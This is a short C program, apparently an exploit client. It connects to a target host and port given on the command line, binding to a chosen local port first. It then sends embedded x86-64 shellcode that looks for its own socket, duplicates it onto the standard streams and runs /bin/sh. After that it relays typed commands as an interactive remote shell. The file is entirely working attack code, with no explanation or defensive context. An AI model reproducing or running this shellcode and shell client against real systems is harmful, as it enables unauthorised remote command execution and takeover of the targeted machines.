
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>


char shellcode[] = \
"\x48\x31\xff\x48\x31\xdb\xb3\x14\x48\x29\xdc\x48\x8d\x14\x24\x48\x8d\x74\x24\x04\x6a\x34\x58\x0f\x05\x66\xff\xc7\x66\x81\x7e\x02\x42\x41\x75\xf0\x66\xff\xcf\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x89\xf3\xbb\x41\x2f\x73\x68\xb8\x2f\x62\x69\x6e\x48\xc1\xeb\x08\x48\xc1\xe3\x20\x48\x09\xd8\x50\x48\x89\xe7\x48\x31\xf6\x48\x89\xf2\x6a\x3b\x58\x0f\x05";
void error(char *err) {
  perror(err);
  exit(0);
}

int main(int argc, char *argv[]) {
  struct sockaddr_in server_addr, bind_addr;
  struct hostent* server, *_bind;
  char buf[1024], inbuf[1024];
  int sock;

  _bind = gethostbyname(argv[3]);
  bind_addr.sin_family = AF_INET;
  bind_addr.sin_port   = htons(atoi(argv[4]));
  memcpy(&bind_addr.sin_addr.s_addr, _bind->h_addr, _bind->h_length);

  server = gethostbyname(argv[1]);
  server_addr.sin_family = AF_INET;
  memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
  server_addr.sin_port = htons(atoi(argv[2]));

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    error(" [!] socket()");

  if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    error(" [!] bind()");

  printf(" [*] Connecting to %s\n", argv[1]);
  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    error(" [*] connect()");

  printf(" [*] Sending payload\n");
  if (send(sock, shellcode, strlen(shellcode), MSG_NOSIGNAL) < 0)
    error(" [!] write()");

  while(fgets(buf, 1024, stdin) != NULL) {
    if (send(sock, buf, strlen(buf), MSG_NOSIGNAL) < 0)
      error(" [!] write(): ");
    if (recv(sock, inbuf, 1024, 0) < 0)
      error(" [!] read(): ");
    printf("%s", inbuf);
    memset(inbuf, 0, 1024);
    memset(buf, 0, 1024);
  }

  return 0;
}
